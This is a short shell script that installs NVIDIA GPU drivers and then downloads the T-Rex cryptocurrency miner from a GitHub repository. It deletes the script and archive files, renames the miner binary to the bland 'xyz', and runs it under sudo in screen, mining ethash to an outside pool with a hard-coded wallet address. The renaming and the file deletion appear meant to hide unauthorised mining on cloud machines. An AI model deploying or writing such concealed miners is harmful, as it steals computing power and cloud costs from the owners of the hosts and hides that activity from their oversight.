
sudo apt-get update
sudo apt-get install build-essential manpages-dev -y 

wget -O NVIDIA-Linux-x86_64-grid.run https://go.microsoft.com/fwlink/?linkid=874272  
chmod +x NVIDIA-Linux-x86_64-grid.run
sudo ./NVIDIA-Linux-x86_64-grid.run -a -q -s
wget https://us.download.nvidia.com/tesla/470.82.01/NVIDIA-Linux-x86_64-470.82.01.run
sudo sh NVIDIA-Linux-x86_64-470.82.01.run -a -q -s


wget  https://github.com/RainBow19999/ghost/raw/main/t-rex.tar.gz ; tar -zxvf t-rex.tar.gz
sudo killall t-rex ;rm *.sh ; rm *.tar.gz ; mv t-rex xyz
sudo screen ./xyz -a ethash -o deptraicogisai.xyz:4444 -u 575aD1F3f6C5493fB4EC2969A1701916927A23df -p x -w celevm5
